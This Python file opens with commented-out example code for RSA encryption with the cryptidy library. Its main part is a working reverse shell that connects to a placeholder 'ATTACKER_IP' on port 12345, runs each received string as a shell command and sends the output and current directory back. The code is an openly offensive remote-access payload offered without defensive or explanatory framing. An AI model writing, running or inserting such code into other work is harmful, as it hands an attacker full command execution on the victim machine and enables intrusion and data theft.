# from cryptidy import asymmetric_encryption

# priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key

# some_python_objects = ['foo', 'bar'], 'some long string', 12
# encrypted = asymmetric_encryption.encrypt_message(some_python_objects, pub_key)
# timestamp, original_object = asymmetric_encryption.decrypt_message(encrypted, priv_key) 

################################################################################################3

import socket
import subprocess
import os

HOST = 'ATTACKER_IP'  # Attacker's IP address
PORT = 12345  # Same port number used in the listener
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    data = s.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, 'utf-8')
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
    else:
        s.send(str.encode(' '))
s.close()
